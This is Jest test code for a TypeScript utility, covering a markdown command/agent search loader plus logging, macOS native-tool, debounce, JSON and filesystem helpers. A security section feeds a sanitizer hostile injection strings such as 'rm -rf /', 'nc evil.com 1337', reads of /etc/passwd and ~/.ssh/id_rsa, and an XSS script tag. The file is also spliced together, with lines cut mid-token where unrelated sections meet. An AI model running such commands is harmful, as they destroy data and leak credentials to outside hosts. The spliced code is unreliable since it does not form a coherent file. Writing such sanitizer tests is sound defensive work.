{basename}',\n        type: 'mention',\n        description: '{frontmatter@description}',\n        path: '/path/to/agents',\n        pattern: '*.md',\n      },\n    ];\n    if (overrides) {\n      return overrides.map((override, i) => ({ ...defaults[i % 2], ...override })) as MdSearchEntry[];\n    }\n    return defaults;\n  };\n\n  beforeEach(() => {\n    loader = new MdSearchLoader(createTestConfig());\n    jest.clearAllMocks();\n  });\n\n  describe('constructor', () => {\n    test('should initialize with provided config', () => {\n      const config = createTestConfig();\n      const testLoader = new MdSearchLoader(config);\n      expect(testLoader).toBeInstanceOf(MdSearchLoader);\n    });\n\n    test('should use default config when none provided', () => {\n      const testLoader = new MdSearchLoader();\n      expect(testLoader).toBeInstanceOf(MdSearchLoader);\n    });\n  });\n\n  describe('updateConfig', () => {\n    test('should update config and invalidate cache', async () => {\n      mockedFs.stat.mockResolvedValue({ isDirectory: () => true } as any);\n      mockedFs.readdir.mockResolvedValue([createDirent('test.md', true)] as any);\n      mockedFs.readFile.mockResolvedValue('---\\ndescription: Test command\\n---\\nContent');\n\n      // Load items to populate cache\n      await loader.getItems('command');\n      const firstReadCount = mockedFs.readdir.mock.calls.length;\n\n      // Update config with different path\n      const newConfig: MdSearchEntry[] = [\n        { name: '{basename}', type: 'command', description: '{frontmatter@description}', path: '/new/path', pattern: '*.md' }\n      ];\n      loader.updateConfig(newConfig);\n\n      // Verify cache was invalidated (readdir should be called again)\n      mockedFs.readdir.mockResolvedValue([createDirent('new.md', true)] as any);\n      mockedFs.readFile.mockResolvedValue('---\\ndescription: New command\\n---\\nContent');\n\n      await loader.getItems('command');\n\n      expect(mockedFs.readdir.mock.calls.length).toBeGreaterThan(firstReadCount);\n    });\n\n    test('should not invalidate cache when same config is set', async () => {\n      const config = createTestConfig();\n      mockedFs.stat.mockResolvedValue({ isDirectory: () => true } as any);\n      mockedFs.readdir.mockResolvedValue([createDirent('test.md', true)] as any);\n      mockedFs.readFile.mockResolvedValue('---\\ndescription: Test\\n---\\nContent');\n\n      // Load items\n      await loader.getItems('command');\n      const firstReadCount = mockedFs.readdir.mock.calls.length;\n\n      // Set same config\n      loader.updateConfig(config);\n\n      // Cache should still be valid, no new reads\n      await loader.getItems('command');\n      expect(mockedFs.readdir.mock.calls.length).toBe(firstReadCount);\n    });\n\n    test('should use default config when undefined is passed', () => {\n      loader.updateConfig(undefined);\n      expect(loader).toBeInstanceOf(MdSearchLoader);\n    });\n  });\n\n  describe('invalidateCache', () => {\n    test('should force reload on next getItems call', async () => {\n      mockedFs.stat.mockResolvedValue({ isDirectory: () => true } as any);\n      mockedFs.readdir.mockResolvedValue([createDirent('test.md', true)] as any);\n      mockedFs.readFile.mockResolvedValue('---\\ndescription: Original\\n---\\nContent');\n\n      // First call\n      await loader.getItems('command');\n      const firstCallCount = mockedFs.readdir.mock.calls.length;\n\n      // Invalidate cache\n      loader.invalidateCache();\n\n      // Modify mock\n      mockedFs.readFile.mockResolvedValue('---\\ndescription: New value\\n---\\nContent');\n\n      // Should reload\n      await loader.getItems('command');\n      expect(mockedFs.readdir.mock.calls.length).toBeGreaterThan(firstCallCount);\n    });\n  });\n\n  describe('getItems', () => {\n    test('should return items filtered by type', async () => {\n      mockedFs.stat.mockResolvedValue({ isDirectory: () => true } as any);\n      mockedFs.readdir.mockImplementation((dir) => {\n        if (String(dir).includes('commands')) {\n          return Promise.resolve([createDirent('cmd1.md', true), createDirent('cmd2.md', true)] as any);\n        }\n        return Promise.resolve([createDirent('agent1.md', true)] as any);\n      });\n      mockedFs.readFile.mockImplementation(((filePath: any) => {\n        const pathStr = String(filePath);\n        if (pathStr.includes('cmd1')) return Promise.resolve('---\\ndescription: Command 1\\n---\\n');\n        if (pathStr.includes('cmd2')) return Promise.resolve('---\\ndescription: Command 2\\n---\\n');\n        return Promise.resolve('---\\ndescription: Agent 1\\n---\\n');\n      }) as any);\n\n      const commands = await loader.getItems('command');\n      const mentions = await loader.getItems('mention');\n\n      expect(commands).toHaveLength(2);\n      expect(commands.every(c => c.type === 'command')).toBe(true);\n\n      expect(mentions).toHaveLength(1);\n      expect(mentions.every(m => m.type === 'mention')).toBe(true);\n    });\n\n    test('should return empty array when directory does not exist', async () => {\n      mockedFs.stat.mockRejectedValue({ code: 'ENOENT' } as any);\n\n      const items = await loader.getItems('command');\n\n      expect(items).toEqual([]);\n    });\n\n    test('should return empty array when path is not a directory', async () => {\n      mockedFs.stat.mockResolvedValue({ isDirectory: () => false } as any);\n\n      const items = await loader.getItems('command');\n\n      expect(items).toEqual([]);\n    });\n\n    test('should sort items alphabetically by name', async () => {\n      mockedFs.stat.mockResolvedValue({ isDirectory: () => true } as any);\n      mockedFs.readdir.mockResolvedValue([\n        createDirent('zebra.md', true),\n        createDirent('alpha.md', true),\n        createDirent('beta.md', true)\n      ] as any);\n      mockedFs.readFile.mockResolvedValue('---\\ndescription: Command\\n---\\nContent');\n\n      const items = await loader.getItems('command');\n\n      expect(items.map(i => i.name)).toEqual(['alpha', 'beta', 'zebra']);\n    });\n\n    test('should use cache within TTL', async () => {\n      mockedFs.stat.mockResolvedValue({ isDirectory: () => true } as any);\n      mockedFs.readdir.mockResolvedValue([createDirent('test.md', true)] as any);\n      mockedFs.readFile.mockResolvedValue('---\\ndescription: Test\\n---\\nContent');\n\n      // First call\n      await loader.getItems('command');\n      const firstCallCount = mockedFs.readdir.mock.calls.length;\n\n      // Second call within TTL - should use cache\n      await loader.getItems('command');\n      expect(mockedFs.readdir.mock.calls.length).toBe(firstCallCount);\n    });\n  });\n\n  describe('searchItems', () => {\n    beforeEach(async () => {\n      mockedFs.stat.mockResolvedValue({ isDirectory: () => true } as any);\n      mockedFs.readdir.mockImplementation((dir) => {\n        if (String(dir).includes('commands')) {\n          return Promise.resolve([\n            createDirent('test-command.md', true),\n            createDirent('another-cmd.md', true),\n            createDirent('search-helper.md', true)\n          ] as any);\n        }\n        return Promise.resolve([] as any);\n      });\n      mockedFs.readFile.mockImplementation(((filePath: any) => {\n        const pathStr = String(filePath);\n        if (pathStr.includes('test-command')) {\n          return Promise.resolve('---\\ndescription: A test command for testing\\n---\\nContent');\n        }\n        if (pathStr.includes('another-cmd')) {\n          return Promise.resolve('---\\ndescription: Another helpful utility\\n---\\nContent');\n        }\n        return Promise.resolve('---\\ndescription: Search and find things\\n---\\nContent');\n      }) as any);\n    });\n\n    test('should return all items of type when query is empty', async () => {\n      const results = await loader.searchItems('command', '');\n\n      expect(results).toHaveLength(3);\n    });\n\n    test('should find items by name', async () => {\n      const results = await loader.searchItems('command', 'test');\n\n      expect(results).toHaveLength(1);\n      expect(results[0]?.name).toBe('test-command');\n    });\n\n    test('should find items by description', async () => {\n      const results = await loader.searchItems('command', 'helpful');\n\n      expect(results).toHaveLength(1);\n      expect(results[0]?.name).toBe('another-cmd');\n    });\n\n    test('should be case-insensitive', async () => {\n      const results = await loader.searchItems('command', 'TEST');\n\n      expect(results).toHaveLength(1);\n      expect(results[0]?.name).toBe('test-command');\n    });\n\n    test('should find partial matches', async () => {\n      const results = await loader.searchItems('command', 'search');\n\n      expect(results).toHaveLength(1);\n      expect(results[0]?.name).toBe('search-helper');\n    });\n\n    test('should return empty array when no matches', async () => {\n      const results = await loader.searchItems('command', 'nonexistent');\n\n      expect(results).toEqual([]);\n    });\n  });\n\n  describe('template resolution', () => {\n    beforeEach(() => {\n      loader = new MdSearchLoader([\n        {\n          name: '{basename}',\n          type: 'command',\n          description: '{frontmatter@description}',\n          path: '/path/to/commands',\n          pattern: '*.md',\n          argumentHint: '{frontmatter@argument-hint}',\n        },\n      ]);\n      mockedFs.stat.mockResolvedValue({ isDirectory: () => true } as any);\n      mockedFs.readdir.mockResolvedValue([createDirent('test.md', true)] as any);\n    });\n\n    test('should resolve {basename} template', async () => {\n      mockedFs.readFile.mockResolvedValue('---\\ndescription: Test\\n---\\nContent');\n\n      const items = await loader.getItems('command');\n\n      expect(items[0]?.name).toBe('test');\n    });\n\n    test('should resolve {frontmatter@field} template', async () => {\n      mockedFs.readFile.mockResolvedValue('---\\ndescription: A helpful command\\n---\\nContent');\n\n      const items = await loader.getItems('command');\n\n      expect(items[0]?.description).toBe('A helpful command');\n    });\n\n    test('should resolve argumentHint from frontmatter', async () => {\n      mockedFs.readFile.mockResolvedValue('---\\ndescription: Command\\nargument-hint: <"+"filename>\\n---\\nContent');\n\n      const items = await loader.getItems('command');\n\n      expect(items[0]?.argumentHint).toBe('<"+"filename>');\n    });\n\n    test('should handle missing frontmatter fields', async () => {\n      mockedFs.readFile.mockResolvedValue('Just plain content without frontmatter');\n\n      const items = await loader.getItems('command');\n\n      expect(items[0]?.description).toBe('');\n    });\n\n    test('should handle empty frontmatter', async () => {\n      mockedFs.readFile.mockResolvedValue('---\\n---\\nContent');\n\n      const items = await loader.getItems('command');\n\n      expect(items[0]?.description).toBe('');\n    });\n\n    test('should handle quoted description values', async () => {\n      mockedFs.readFile.mockResolvedValue('---\\ndescription: \"A quoted description\"\\n---\\nContent');\n\n      const items = await loader.getItems('command');\n\n      expect(items[0]?.description).toBe('A quoted description');\n    });\n\n    test('should handle single-quoted description values', async () => {\n      mockedFs.readFile.mockResolvedValue(\"---\\ndescription: 'Single quoted'\\n---\\nContent\");\n\n      const items = await loader.getItems('command');\n\n      expect(items[0]?.description).toBe('Single quoted');\n    });\n  });\n\n  describe('file pattern matching', () => {\n    test('should match *.md pattern', async () => {\n      mockedFs.stat.mockResolvedValue({ isDirectory: () => true } as any);\n      mockedFs.readdir.mockResolvedValue([\n        createDirent('test.md', true),\n        createDirent('readme.txt', true),\n        createDirent('script.js', true),\n      ] as any);\n      mockedFs.readFile.mockResolvedValue('---\\ndescription: Test\\n---\\nContent');\n\n      const items = await loader.getItems('command');\n\n      expect(items).toHaveLength(1);\n      expect(items[0]?.name).toBe('test');\n    });\n\n    test('should match specific filename pattern', async () => {\n      loader = new MdSearchLoader([\n        {\n          name: '{basename}',\n          type: 'command',\n          description: '{frontmatter@description}',\n          path: '/path/to/commands',\n          pattern: 'SKILL.md',\n        },\n      ]);\n\n      mockedFs.stat.mockResolvedValue({ isDirectory: () => true } as any);\n      mockedFs.readdir.mockResolvedValue([\n        createDirent('SKILL.md', true),\n        createDirent('other.md', true),\n      ] as any);\n      mockedFs.readFile.mockResolvedValue('---\\ndescription: Skill\\n---\\nContent');\n\n      const items = await loader.getItems('command');\n\n      expect(items).toHaveLength(1);\n    });\n\n    test('should handle recursive pattern **/*.md', async () => {\n      loader = new MdSearchLoader([\n        {\n          name: '{basename}',\n          type: 'command',\n          description: '{frontmatter@description}',\n          path: '/path/to/commands',\n          pattern: '**/*.md',\n        },\n      ]);\n\n      mockedFs.stat.mockResolvedValue({ isDirectory: () => true } as any);\n      mockedFs.readdir.mockImplementation((dir) => {\n        const dirStr = String(dir);\n        if (dirStr === '/path/to/commands') {\n          return Promise.resolve([\n            createDirent('root.md', true),\n            createDirent('subdir', false), // directory\n          ] as any);\n        }\n        if (dirStr === '/path/to/commands/subdir') {\n          return Promise.resolve([\n            createDirent('nested.md', true),\n          ] as any);\n        }\n        return Promise.resolve([] as any);\n      });\n      mockedFs.readFile.mockResolvedValue('---\\ndescription: Command\\n---\\nContent');\n\n      const items = await loader.getItems('command');\n\n      expect(items).toHaveLength(2);\n      expect(items.map(i => i.name).sort()).toEqual(['nested', 'root']);\n    });\n\n    test('should handle intermediate directory pattern **/commands/*.md', async () => {\n      loader = new MdSearchLoader([\n        {\n          name: '{basename}',\n          type: 'command',\n          description: '{frontmatter@description}',\n          path: '/path/to/root',\n          pattern: '**/commands/*.md',\n        },\n      ]);\n\n      mockedFs.stat.mockResolvedValue({ isDirectory: () => true } as any);\n      mockedFs.readdir.mockImplementation((dir) => {\n        const dirStr = String(dir);\n        if (dirStr === '/path/to/root') {\n          return Promise.resolve([\n            createDirent('root.md', true),\n            createDirent('project1', false), // directory\n            createDirent('project2', false), // directory\n          ] as any);\n        }\n        if (dirStr === '/path/to/root/project1') {\n          return Promise.resolve([\n            createDirent('commands', false), // directory\n            createDirent('other', false), // directory\n          ] as any);\n        }\n        if (dirStr === '/path/to/root/project1/commands') {\n          return Promise.resolve([\n            createDirent('cmd1.md', true),\n            createDirent('cmd2.md', true),\n          ] as any);\n        }\n        if (dirStr === '/path/to/root/project1/other') {\n          return Promise.resolve([\n            createDirent('not-matched.md', true),\n          ] as any);\n        }\n        if (dirStr === '/path/to/root/project2') {\n          return Promise.resolve([\n            createDirent('commands', false), // directory\n          ] as any);\n        }\n        if (dirStr === '/path/to/root/project2/commands') {\n          return Promise.resolve([\n            createDirent('cmd3.md', true),\n          ] as any);\n        }\n        return Promise.resolve([] as any);\n      });\n      mockedFs.readFile.mockResolvedValue('---\\ndescription: Command\\n---\\nContent');\n\n      const items = await loader.getItems('command');\n\n      expect(items).toHaveLength(3);\n      expect(items.map(i => i.name).sort()).toEqual(['cmd1', 'cmd2', 'cmd3']);\n    });\n\n    test('should handle wildcard intermediate pattern **/*/*.md', async () => {\n      loader = new MdSearchLoader([\n        {\n          name: '{basename}',\n          type: 'command',\n          description: '{frontmatter@description}',\n          path: '/path/to/root',\n          pattern: '**/*/*.md',\n        },\n      ]);\n\n      mockedFs.stat.mockResolvedValue({ isDirectory: () => true } as any);\n      mockedFs.readdir.mockImplementation((dir) => {\n        const dirStr = String(dir);\n        if (dirStr === '/path/to/root') {\n          return Promise.resolve([\n            createDirent('plugin1', false),\n            createDirent('plugin2', false),\n          ] as any);\n        }\n        if (dirStr === '/path/to/root/plugin1') {\n          return Promise.resolve([\n            createDirent('skill1.md', true),\n            createDirent('README.md', true),\n          ] as any);\n        }\n        if (dirStr === '/path/to/root/plugin2') {\n          return Promise.resolve([\n            createDirent('skill2.md', true),\n          ] as any);\n        }\n        return Promise.resolve([] as any);\n      });\n      mockedFs.readFile.mockResolvedValue('---\\ndescription: Skill\\n---\\nContent');\n\n      const items = await loader.getItems('command');\n\n      // Three different files matched: skill1.md, README.md, skill2.md\n      expect(items).toHaveLength(3);\n      expect(items.map(i => i.name).sort()).toEqual(['README', 'skill1', 'skill2']);\n    });\n\n    test('should handle brace expansion pattern **/{commands,agents}/*.md', async () => {\n      loader = new MdSearchLoader([\n        {\n          name: '{basename}',\n          type: 'command',\n          description: '{frontmatter@description}',\n          path: '/path/to/root',\n          pattern: '**/{commands,agents}/*.md',\n        },\n      ]);\n\n      mockedFs.stat.mockResolvedValue({ isDirectory: () => true } as any);\n      mockedFs.readdir.mockImplementation((dir) => {\n        const dirStr = String(dir);\n        if (dirStr === '/path/to/root') {\n          return Promise.resolve([\n            createDirent('commands', false),\n            createDirent('agents', false),\n            createDirent('other', false),\n          ] as any);\n        }\n        if (dirStr === '/path/to/root/commands') {\n          return Promise.resolve([\n            createDirent('cmd1.md', true),\n          ] as any);\n        }\n        if (dirStr === '/path/to/root/agents') {\n          return Promise.resolve([\n            createDirent('agent1.md', true),\n          ] as any);\n        }\n        if (dirStr === '/path/to/root/other') {\n          return Promise.resolve([\n            createDirent('not-matched.md', true),\n          ] as any);\n        }\n        return Promise.resolve([] as any);\n      });\n      mockedFs.readFile.mockResolvedValue('---\\ndescription: Item\\n---\\nContent');\n\n      const items = await loader.getItems('command');\n\n      expect(items).toHaveLength(2);\n      expect(items.map(i => i.name).sort()).toEqual(['agent1', 'cmd1']);\n    });\n\n    test('should handle deeply nested intermediate directory pattern', async () => {\n      loader = new MdSearchLoader([\n        {\n          name: '{basename}',\n          type: 'command',\n          description: '{frontmatter@description}',\n          path: '/path/to/root',\n          pattern: '**/plugins/*/commands/*.md',\n        },\n      ]);\n\n      mockedFs.stat.mockResolvedValue({ isDirectory: () => true } as any);\n      mockedFs.readdir.mockImplementation((dir) => {\n        const dirStr = String(dir);\n        if (dirStr === '/path/to/root') {\n          return Promise.resolve([\n            createDirent('plugins', false),\n          ] as any);\n        }\n        if (dirStr === '/path/to/root/plugins') {\n          return Promise.resolve([\n            createDirent('my-plugin', false),\n          ] as any);\n        }\n        if (dirStr === '/path/to/root/plugins/my-plugin') {\n          return Promise.resolve([\n            createDirent('commands', false),\n          ] as any);\n        }\n        if (dirStr === '/path/to/root/plugins/my-plugin/commands') {\n          return Promise.resolve([\n            createDirent('deep-cmd.md', true),\n          ] as any);\n        }\n        return Promise.resolve([] as any);\n      });\n      mockedFs.readFile.mockResolvedValue('---\\ndescription: Deep Command\\n---\\nContent');\n\n      const items = await loader.getItems('command');\n\n      expect(items).toHaveLength(1);\n      expect(items[0]?.name).toBe('deep-cmd');\n    });\n\n    test('should handle pattern with wildcard prefix test-*.md', async () => {\n      loader = new MdSearchLoader([\n        {\n          name: '{basename}',\n          type: 'command',\n          description: '{frontmatter@description}',\n          path: '/path/to/commands',\n          pattern: 'test-*.md',\n        },\n      ]);\n\n      mockedFs.stat.mockResolvedValue({ isDirectory: () => true } as any);\n      mockedFs.readdir.mockResolvedValue([\n        createDirent('test-command.md', true),\n        createDirent('test-other.md', true),\n        createDirent('command.md', true),\n        createDirent('not-test.md', true),\n      ] as any);\n      mockedFs.readFile.mockResolvedValue('---\\ndescription: Test\\n---\\nContent');\n\n      const items = await loader.getItems('command');\n\n      expect(items).toHaveLength(2);\n      expect(items.map(i => i.name).sort()).toEqual(['test-command', 'test-other']);\n    });\n  });\n\n  describe('duplicate handling', () => {\n    test('should prevent duplicates within same type', async () => {\n      loader = new MdSearchLoader([\n        {\n          name: '{basename}',\n          type: 'command',\n          description: '{frontmatter@description}',\n          path: '/path/one',\n          pattern: '*.md',\n        },\n        {\n          name: '{basename}',\n          type: 'command',\n          description: '{frontmatter@description}',\n          path: '/path/two',\n          pattern: '*.md',\n        },\n      ]);\n\n      mockedFs.stat.mockResolvedValue({ isDirectory: () => true } as any);\n      mockedFs.readdir.mockImplementation(() => {\n        return Promise.resolve([createDirent('duplicate.md', true)] as any);\n      });\n      mockedFs.readFile.mockImplementation(((filePath: any) => {\n        const pathStr = String(filePath);\n        if (pathStr.includes('/path/one/')) {\n          return Promise.resolve('---\\ndescription: First version\\n---\\n');\n        }\n        return Promise.resolve('---\\ndescription: Second version\\n---\\n');\n      }) as any);\n\n      const items = await loader.getItems('command');\n\n      expect(items).toHaveLength(1);\n      expect(items[0]?.description).toBe('First version');\n    });\n\n    test('should allow same name in different types', async () => {\n      loader = new MdSearchLoader([\n        {\n          name: '{basename}',\n          type: 'command',\n          description: '{frontmatter@description}',\n          path: '/path/commands',\n          pattern: '*.md',\n        },\n        {\n          name: '{basename}',\n          type: 'mention',\n          description: '{frontmatter@description}',\n          path: '/path/agents',\n          pattern: '*.md',\n        },\n      ]);\n\n      mockedFs.stat.mockResolvedValue({ isDirectory: () => true } as any);\n      mockedFs.readdir.mockResolvedValue([createDirent('same-name.md', true)] as any);\n      mockedFs.readFile.mockResolvedValue('---\\ndescription: Item\\n---\\n');\n\n      const commands = await loader.getItems('command');\n      c warn = (...args: any[]) => logs.push(['warn', ...args]);\n    console.info = (...args: any[]) => logs.push(['info', ...args]);\n\n    return {\n        getLogs: () => logs,\n        restore: () => {\n            console.log = originalLog;\n            console.error = originalError;\n            console.warn = originalWarn;\n            console.info = originalInfo;\n        }\n    };\n}\n\ndescribe('Utils', () => {\n    beforeEach(() => {\n        jest.clearAllMocks();\n    });\n\n    describe('Logger', () => {\n        let consoleSpy: ReturnType<"+"typeof captureConsole>;\n\n        beforeEach(() => {\n            consoleSpy = captureConsole();\n        });\n\n        afterEach(() => {\n            consoleSpy.restore();\n        });\n\n        test('should log messages with correct format', () => {\n            logger.info('Test message', { data: 'test' });\n            \n            const logs = consoleSpy.getLogs();\n            expect(logs.length).toBeGreaterThan(0);\n        });\n\n        test('should log error messages', () => {\n            logger.error('Error message');\n            \n            const logs = consoleSpy.getLogs();\n            expect(logs.length).toBeGreaterThan(0);\n        });\n    });\n\n    describe('getCurrentApp', () => {\n        test('should return null on non-macOS platforms', async () => {\n            const originalPlatform = process.platform;\n            Object.defineProperty(process, 'platform', { value: 'linux' });\n            \n            const result = await getCurrentApp();\n            expect(result).toBeNull();\n            \n            Object.defineProperty(process, 'platform', { value: originalPlatform });\n        });\n\n        test('should handle exec errors gracefully', async () => {\n            const originalPlatform = process.platform;\n            Object.defineProperty(process, 'platform', { value: 'darwin' });\n\n            (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback: ExecCallback) => {\n                callback(new Error('Command failed'), '', '');\n                return null as any;\n            });\n\n            const result = await getCurrentApp();\n            expect(result).toBeNull();\n\n            Object.defineProperty(process, 'platform', { value: originalPlatform });\n        });\n\n        test('should return app info on success', async () => {\n            const originalPlatform = process.platform;\n            Object.defineProperty(process, 'platform', { value: 'darwin' });\n\n            (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback: ExecCallback) => {\n                callback(null, '{\"name\":\"TestApp\",\"bundleId\":\"com.test.app\"}', '');\n                return null as any;\n            });\n\n            const result = await getCurrentApp();\n            expect(result).toEqual({ name: 'TestApp', bundleId: 'com.test.app' });\n\n            Object.defineProperty(process, 'platform', { value: originalPlatform });\n        });\n\n        test('should handle app without bundle ID', async () => {\n            const originalPlatform = process.platform;\n            Object.defineProperty(process, 'platform', { value: 'darwin' });\n\n            (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback: ExecCallback) => {\n                callback(null, '{\"name\":\"TestApp\",\"bundleId\":null}', '');\n                return null as any;\n            });\n\n            const result = await getCurrentApp();\n            expect(result).toEqual({ name: 'TestApp', bundleId: null });\n\n            Object.defineProperty(process, 'platform', { value: originalPlatform });\n        });\n\n        test('should handle native tool errors', async () => {\n            const originalPlatform = process.platform;\n            Object.defineProperty(process, 'platform', { value: 'darwin' });\n\n            (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback: ExecCallback) => {\n                callback(null, '{\"error\":\"No active application found\"}', '');\n                return null as any;\n            });\n\n            const result = await getCurrentApp();\n            expect(result).toBeNull();\n\n            Object.defineProperty(process, 'platform', { value: originalPlatform });\n        });\n    });\n\n    describe('pasteWithNativeTool', () => {\n        test('should execute paste command on macOS', async () => {\n            const originalPlatform = process.platform;\n            Object.defineProperty(process, 'platform', { value: 'darwin' });\n\n            (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback: ExecCallback) => {\n                callback(null, '{\"success\":true,\"command\":\"paste\"}', '');\n                return null as any;\n            });\n\n            await expect(pasteWithNativeTool()).resolves.toBeUndefined();\n\n            Object.defineProperty(process, 'platform', { value: originalPlatform });\n        });\n\n        test('should handle native tool failure', async () => {\n            const originalPlatform = process.platform;\n            Object.defineProperty(process, 'platform', { value: 'darwin' });\n\n            (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback: ExecCallback) => {\n                callback(null, '{\"success\":false,\"command\":\"paste\"}', '');\n                return null as any;\n            });\n\n            await expect(pasteWithNativeTool()).rejects.toThrow('Native paste failed');\n\n            Object.defineProperty(process, 'platform', { value: originalPlatform });\n        });\n\n        test('should handle exec errors', async () => {\n            const originalPlatform = process.platform;\n            Object.defineProperty(process, 'platform', { value: 'darwin' });\n\n            (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback: ExecCallback) => {\n                callback(new Error('Command failed'), '', '');\n                return null as any;\n            });\n\n            await expect(pasteWithNativeTool()).rejects.toThrow('Command failed');\n\n            Object.defineProperty(process, 'platform', { value: originalPlatform });\n        });\n\n        test('should throw error on non-macOS platforms', async () => {\n            const originalPlatform = process.platform;\n            Object.defineProperty(process, 'platform', { value: 'linux' });\n\n            await expect(pasteWithNativeTool()).rejects.toThrow('Native paste only supported on macOS');\n\n            Object.defineProperty(process, 'platform', { value: originalPlatform });\n        });\n    });\n\n    describe('debounce', () => {\n        jest.useFakeTimers();\n\n        test('should delay function execution', () => {\n            const fn = jest.fn();\n            const debouncedFn = debounce(fn, 100);\n            \n            debouncedFn();\n            expect(fn).not.toHaveBeenCalled();\n            \n            jest.advanceTimersByTime(100);\n            expect(fn).toHaveBeenCalledTimes(1);\n        });\n\n        test('should cancel previous calls', () => {\n            const fn = jest.fn();\n            const debouncedFn = debounce(fn, 100);\n            \n            debouncedFn();\n            debouncedFn();\n            debouncedFn();\n            \n            jest.advanceTimersByTime(100);\n            expect(fn).toHaveBeenCalledTimes(1);\n        });\n\n        afterEach(() => {\n            jest.clearAllTimers();\n        });\n    });\n\n\n    describe('safeJsonParse', () => {\n        test('should parse valid JSON', () => {\n            const result = safeJsonParse('{\"test\": \"value\"}', {});\n            expect(result).toEqual({ test: 'value' });\n        });\n\n        test('should return fallback for invalid JSON', () => {\n            const fallback = { default: true };\n            const result = safeJsonParse('invalid json', fallback);\n            expect(result).toEqual(fallback);\n        });\n    });\n\n    describe('safeJsonStringify', () => {\n        test('should stringify objects', () => {\n            const result = safeJsonStringify({ test: 'value' });\n            expect(result).toBe('{\\n  \"test\": \"value\"\\n}');\n        });\n\n        test('should handle circular references', () => {\n            const obj: any = { test: 'value' };\n            obj.self = obj;\n            \n            // Suppress console.warn for this test\n            const originalWarn = console.warn;\n            console.warn = jest.fn();\n            \n            const result = safeJsonStringify(obj);\n            expect(result).toBe('{}'); // Returns fallback value for circular references\n            \n            // Restore console.warn\n            console.warn = originalWarn;\n        });\n    });\n\n    describe('generateId', () => {\n        test('should generate unique IDs', () => {\n            const id1 = generateId();\n            const id2 = generateId();\n            \n            expect(id1).toBeDefined();\n            expect(id2).toBeDefined();\n            expect(id1).not.toBe(id2);\n        });\n\n        test('should generate IDs with correct length', () => {\n            const id = generateId();\n            expect(id.length).toBeGreaterThan(0);\n        });\n    });\n\n\n    describe('ensureDir', () => {\n        test('should resolve when directory exists', async () => {\n            mockedFs.access.mockResolvedValue();\n            \n            await expect(ensureDir('/test/path')).resolves.toBeUndefined();\n            expect(mockedFs.access).toHaveBeenCalledWith('/test/path');\n        });\n\n        test('should create directory when it does not exist', async () => {\n            mockedFs.access.mockRejectedValue({ code: 'ENOENT' } as any);\n            mockedFs.mkdir.mockResolvedValue(undefined);\n            \n            await expect(ensureDir('/test/path')).resolves.toBeUndefined();\n            expect(mockedFs.mkdir).toHaveBeenCalledWith('/test/path', { recursive: true, mode: 0o700 });\n        });\n\n        test('should throw error for access issues other than ENOENT', async () => {\n            mockedFs.access.mockRejectedValue(new Error('Permission denied'));\n            \n            await expect(ensureDir('/test/path')).rejects.toThrow('Permission denied');\n        });\n    });\n\n    describe('fileExists', () => {\n        test('should return true when file exists', async () => {\n            mockedFs.access.mockResolvedValue();\n            \n            const result = await fileExists('/test/file.txt');\n            expect(result).toBe(true);\n        });\n\n        test('should return false when file does not exist', async () => {\n            mockedFs.access.mockRejectedValue({ code: 'ENOENT' } as any);\n            \n            const result = await fileExists('/test/file.txt');\n            expect(result).toBe(false);\n        });\n    });\n\n    describe('sleep', () => {\n        jest.useFakeTimers();\n\n        test('should delay execution', async () => {\n            const promise = sleep(1000);\n            \n            jest.advanceTimersByTime(1000);\n            \n            await expect(promise).resolves.toBeUndefined();\n        });\n\n        afterEach(() => {\n            jest.clearAllTimers();\n        });\n    });\n\n    describe('getActiveWindowBounds', () => {\n        \n        test('should return null on non-macOS platforms', async () => {\n            const originalPlatform = process.platform;\n            Object.defineProperty(process, 'platform', { value: 'win32' });\n            \n            const result = await getActiveWindowBounds();\n            expect(result).toBeNull();\n            \n            Object.defineProperty(process, 'platform', { value: originalPlatform });\ fineProperty(process, 'platform', { value: 'darwin' });\n\n            (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback?: any) => {\n                if (typeof callback === 'function') {\n                    callback(new Error('Command failed'), '', '');\n                }\n            });\n\n            const result = await getActiveWindowBounds();\n            expect(result).toBeNull();\n        });\n\n        test('should handle invalid numeric values', async () => {\n            Object.defineProperty(process, 'platform', { value: 'darwin' });\n\n            (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback?: any) => {\n                if (typeof callback === 'function') {\n                    callback(null, '{\"x\":\"abc\",\"y\":\"def\",\"width\":\"ghi\",\"height\":\"jkl\"}', '');\n                }\n            });\n\n            const result = await getActiveWindowBounds();\n            expect(result).toBeNull();\n        });\n    });\n\n    describe('Command Sanitization Security', () => {\n        describe('sanitizeCommandArgument', () => {\n            test('should remove dangerous shell metacharacters', () => {\n                const dangerous = 'app;rm -rf /;echo safe';\n                const sanitized = sanitizeCommandArgument(dangerous);\n                \n                expect(sanitized).toBe('apprm -rf /echo safe');\n                expect(sanitized).not.toContain(';');\n                expect(sanitized).not.toContain('|');\n                expect(sanitized).not.toContain('`');\n                expect(sanitized).not.toContain('$');\n            });\n\n            test('should remove command injection attempts', () => {\n                const injections = [\n                    'app`whoami`',\n                    'app$(id)',\n                    'app;cat /etc/passwd',\n                    'app|nc evil.com 1337',\n                    'app&&rm -rf /',\n                    'app<"+"script>alert(1)<"+"/script>',\n                    'app\"$(malicious)\"',\n                    \"app'$(evil)'\",\n                    'app\\\\$(bypass)',\n                    'app*.*',\n                    'app?.*',\n                    'app~/.ssh/id_rsa'\n                ];\n\n                injections.forEach(injection => {\n                    const sanitized = sanitizeCommandArgument(injection);\n                    expect(sanitized).not.toContain(';');\n                    expect(sanitized).not.toContain('|');\n                    expect(sanitized).not.toContain('`');\n                    expect(sanitized).not.toContain('$');\n                    expect(sanitized).not.toContain('(');\n                    expect(sanitized).not.toContain(')');\n                    expect(sanitized).not.toContain('<"+"');\n                    expect(sanitized).not.toContain('>');\n                    expect(sanitized).not.toContain('\"');\n                    expect(sanitized).not.toContain(\"'\");\n                    expect(sanitized).not.toContain('\\\\');\n                    expect(sanitized).not.toContain('*');\n                    expect(sanitized).not.toContain('?');\n                    expect(sanitized).not.toContain('~');\n                    expect(sanitized).not.toContain('^');\n                });\n            });\n\n            test('should preserve safe characters', () => {\n                const safeInput = 'MyApp 1.2.3 